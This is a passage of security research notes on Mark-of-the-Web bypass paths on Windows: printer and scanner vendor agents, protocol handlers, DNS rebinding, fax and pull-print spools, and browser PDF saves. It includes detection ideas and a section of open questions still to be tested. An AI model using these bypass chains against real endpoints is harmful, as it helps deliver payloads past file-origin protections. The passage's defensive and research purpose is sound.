              → vendor agent writes file to requested path
              → file has NO MOTW (vendor agent process is the writer)
```

Same pattern as the "localhost server" primitive — and vendor print/scan
agents are probably the most commonly-installed localhost-listeners on
enterprise endpoints that *aren't* dev tools.

Variants:
- **Protocol handler trigger**: smuggled HTML navigates to `hp-scan://acquire?destination=C:\Users\victim\Downloads\`. Depends on what each vendor's handler accepts.
- **Update/firmware download abuse**: agent fetches updates from URL it's willing to be told about; attacker redirects to attacker-controlled URLs, agent writes "update" (payload) to disk.
- **DNS rebinding against the vendor agent**: makes `127.0.0.1:<port>` same-origin-reachable from attacker's page.

### Novel / under-explored angles

1. **Fleet reconnaissance via ICE / port scan from smuggled HTML**: identify which vendor agent is installed (by probing known ports) and tailor payload. Modulo PNA constraints.
2. **Fax services** — `fxsclnt.exe` / fax service still present on some Windows. Received faxes → no MOTW.
3. **Network Scanner WSD / ePrint paths** — WSD can trigger scan-push to pre-configured destinations.
4. **Xerox / HP "Pull Print" queues** — secure-release printing; spool files stored locally. If misconfigured, job data lands on disk without MOTW.
5. **"Print to Cloud" / HP ePrint / Canon Send** — cloud-sync-like, inherits MOTW-bypass of cloud sync category.

### Uncertainties to test

1. **Which vendor agents in 2026 expose local HTTP endpoints, and what do they accept?** Per-vendor lab testing.
2. **Protocol-handler arg schemas**: each vendor's URI format; whether they accept destination paths.
3. **Does DNS rebinding still work against these agents?** Modern mitigations reduce but don't eliminate.
4. **Attachment Manager classification of printer-spooled PDFs**: likely none, confirm via `:Zone.Identifier`.
5. **What spool-folder writes persist when jobs fail?** Potentially user-visible residues.

### Detection angle

- File creation by known vendor-agent processes (`HPScanApp.exe`, `CanonIJSU.exe`, `EpsonScanSmart.exe`) into user paths outside the agent's own AppData.
- Inbound loopback HTTP to known vendor-agent ports from browser parents — unusual.
- Print-to-PDF jobs where output path is a network share or user-writable exe-friendly folder.

### Realism summary

Scan-to-folder and print-spooler angles are real but don't chain well with
HTML smuggling. The **vendor-agent localhost-server** angle does chain well
and is a specific instance of the general "localhost HTTP server"
primitive — with the advantage that these agents are installed on a
meaningful fraction of enterprise endpoints by IT without security review.

Files alongside cloud-sync in "commonly installed, rarely scrutinized,
MOTW-free file writes by design."

## 4b. Browser built-in PDF viewer "Save" (short note)

### The quirk

Chromium's PDFium viewer renders PDFs inline. The "Download" button
re-serializes the PDF. Historically there have been inconsistencies across
Chromium/Edge/Firefox versions about whether this path routes through the
standard download machinery (which applies MOTW) or a separate serializer
(which doesn't). Discussed publicly ~2020–2022; Chromium tightened the path
so the Save button now writes through the normal download stack. Edge's
PDF viewer, Firefox's pdf.js save, and corporate-EDR PDF-viewer extensions
remain worth individually testing.

### ITW usage

**Not a documented/named attacker technique as far as public reporting
shows.** PDFs are heavily used in phishing, but almost always for:

- Links/lures inside the PDF content (not an MOTW angle).
- Embedded Launch Actions / embedded attachments with old Reader versions (category 7, application unpackers).
- Parser-exploit RCE (once you have RCE, MOTW is moot).

### Why attackers don't lean on it

- PDFs don't auto-execute. MOTW on a PDF only matters for Adobe Protected View.
- Defeating Protected View is *useful* (enables social-engineering, credential harvest forms) but not critical.
- Easier ways exist to get a MOTW-less PDF on disk (sync clients, etc.).
- "Inline view → Save" is a two-action user flow; attackers prefer one-click.

### Verdict

Real quirk, marginal attacker utility, not a headline primitive. Good lab
experiment; not a detection priority.
